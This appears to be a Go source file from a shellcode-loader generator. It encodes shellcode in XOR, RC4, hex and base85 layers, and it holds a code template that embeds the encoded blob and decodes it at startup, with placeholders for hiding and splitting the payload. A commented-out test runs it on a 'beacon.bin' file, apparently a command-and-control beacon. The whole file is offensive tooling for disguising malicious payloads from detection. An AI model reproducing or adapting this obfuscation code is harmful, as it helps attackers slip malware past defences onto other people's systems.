package encode

import (
	_ "embed"
	"encoding/hex"
	"github.com/darkwyrm/b85"
)

var (
	Decode1string = []string{
		`//go:embed {{.shellcode}}
var {{.shellcode}} []byte
//go:embed {{.name}}
var {{.name}} []byte

func init() {
	//__HIDE__
	//__SEPARATE__
	{{.shellcode}}, _ = b85.Decode(string({{.shellcode}}))
	{{.shellcode}}, _ = hex.DecodeString(string({{.shellcode}}))
    {{.shellcode}} = {{.rc4}}({{.shellcode}}, []byte(string({{.name}})+"123456"))
	{{.shellcode}} = {{.xor}}({{.shellcode}}, {{.name}})
}
func {{.xor}}({{.canshu}} []byte, Key []byte) []byte {
	var result []byte
	for i := 0; i < len({{.canshu}}); i++ {
		result = append(result, {{.canshu}}[i]^Key[i%len(Key)])
	}
	return result
}
func {{.rc4}}({{.canshu}} []byte, key []byte) []byte {
	cipher, err := rc4.NewCipher(key)
	if err != nil {
		log.Println(err)
	}
	decryptedBytes := make([]byte, len({{.canshu}}))
	cipher.XORKeyStream(decryptedBytes, {{.canshu}})
	return decryptedBytes
}`, `
	"encoding/hex"
    "crypto/rc4"
	"github.com/darkwyrm/b85"
    "log"
	//__IMPORT__`,
	}
)

//xor + hex + base85

func Encode1(shellcode []byte, key []byte) []byte {
	var encodedbyte []byte
	encodedbyte = Xor(shellcode, key)
	encodedbyte = rc4encode(encodedbyte, []byte(string(key)+"123456"))
	encodedbyte = []byte(hex.EncodeToString(encodedbyte))
	encodedbyte = []byte(b85.Encode(encodedbyte))
	return encodedbyte
}

func Decode1(encodedbyte []byte, key []byte) []byte {
	var shellcode []byte
	shellcode, _ = b85.Decode(string(encodedbyte))
	shellcode, _ = hex.DecodeString(string(shellcode))
	shellcode = rc4decode(shellcode, []byte(string(key)+"123456"))
	shellcode = Xor(shellcode, key)
	return shellcode
}

//success
//func test() {
//	key := []byte("testtest")
//	testbyte, _ := ioutil.ReadFile("beacon.bin")
//	beforebyte := testbyte
//	encodedbyte := encode1(testbyte, key)
//	afterbyte := decode1(encodedbyte, key)
//	if bytes.Equal(afterbyte, beforebyte) {
//		println("success")
//	}
//}
